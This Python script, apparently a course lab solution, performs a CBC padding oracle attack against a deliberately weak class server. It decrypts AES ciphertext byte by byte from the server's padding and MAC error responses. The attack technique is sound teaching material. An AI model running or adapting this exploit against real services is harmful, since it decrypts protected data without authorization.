# Script that performs a padding oracle attack on a weak website

#!/usr/bin/python3

# Run me like this:
# $ python3 padding_oracle.py "http://cpsc4200.mpese.com/cdcrock/paddingoracle/verify" "43bc9504020c958510b14bece5d8b6485914673abd8117482a21f55036bf018d03992a83e20ad09859e4cd274d79a933fa4784a24657598266975db442297a2eafaf54fe4508a35381a83a958146dea21fedbd9c7239a57017c79d3f4d36b263bdd8b62827483138491799d773c9028e5a591ce9f24a5c28ad799489a14d1950"
# or select "Padding Oracle" from the VS Code debugger

import json
import sys
import time
from Crypto.Cipher import AES
from typing import Union, Dict, List

import requests

# Create one session for each oracle request to share. This allows the
# underlying connection to be re-used, which speeds up subsequent requests!
s = requests.session()


def oracle(url: str, messages: List[bytes]) -> List[Dict[str, str]]:
    while True:
        try:
            r = s.post(url, data={"message": [m.hex() for m in messages]})
            r.raise_for_status()
            return r.json()
        # Under heavy server load, your request might time out. If this happens,
        # the function will automatically retry in 10 seconds for you.
        except requests.exceptions.RequestException as e:
            sys.stderr.write(str(e))
            sys.stderr.write("\nRetrying in 10 seconds...\n")
            time.sleep(10)
            continue
        except json.JSONDecodeError as e:
            sys.stderr.write("It's possible that the oracle server is overloaded right now, or that provided URL is wrong.\n")
            sys.stderr.write("If this keeps happening, check the URL. Perhaps your uniqname is not set.\n")
            sys.stderr.write("Retrying in 10 seconds...\n\n")
            time.sleep(10)
            continue


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} ORACLE_URL CIPHERTEXT_HEX", file=sys.stderr)
        sys.exit(-1)
    oracle_url, message = sys.argv[1], bytes.fromhex(sys.argv[2])

    if oracle(oracle_url, [message])[0]["status"] != "valid":
        print("Message invalid", file=sys.stderr)
    
    #Variable Definitions
    block_size = AES.block_size                 #AES-128 block size
    message_len = len(message)                  #Length of CBC message
    num_blocks = int(message_len/block_size)    #Calculate number of blocks in the message (assign to an int)
    decrypted = bytearray()                     #Empty bytearray to store final message in 
    
    #for number of blocks to 0 backwards
    for x in range(num_blocks, 0, -1):
        plaintext_block = bytearray(block_size)     #Empty block to store decyphered plaintext block
        desired_padding = 1                         #Value we want the padding to be
              
        #Get the current block
        block = bytearray(message[(x-1) * block_size: x * block_size])
        
        #Get the previous block
        if(x == 1):
            last_block = bytearray(block_size) #if this is the first block, use an empty block
        elif(x != 1):
            last_block = bytearray(message[(x-2) * block_size: (x-1) * block_size])
        
        modified_block = last_block #need to modify the last block so we can put it before the current one and test the padding
        
        #Test every byte in the block going backwards
        for y in range(block_size, 0, -1):
            #create an empty array to store blocks with possible attack combinations
            attack_blocks = []
            for m in range(0, 256):
                #increase the current byte by 1
                modified_block[y-1] = (modified_block[y-1] + 1) % 256
                #Concatenate modified last block with current block
                padding_test_blocks = bytes(modified_block) + block
                attack_blocks.append(padding_test_blocks)
            #test all modified blocks for valid padding
            oracle_return = oracle(oracle_url, attack_blocks)
            for r in range(len(oracle_return)):
                if(oracle_return[r]["status"] == "invalid_mac"):
                    modified_block = bytearray(attack_blocks[r][:-16])
                    #XOR modified block with the previous ciphertext block to get plaintext
                    plaintext_block[-desired_padding] = modified_block[-desired_padding] ^ last_block[-desired_padding] ^ desired_padding
                    for i in range(1, desired_padding + 1):
                        modified_block[-i] = (desired_padding + 1) ^ plaintext_block[-i] ^ last_block[-i]
                    
                    break
            desired_padding += 1        
        decrypted = bytes(plaintext_block) + bytes(decrypted)
        
    decrypted = decrypted[:-32-decrypted[-1]][16:]
    print(decrypted.decode())


if __name__ == '__main__':
    main()

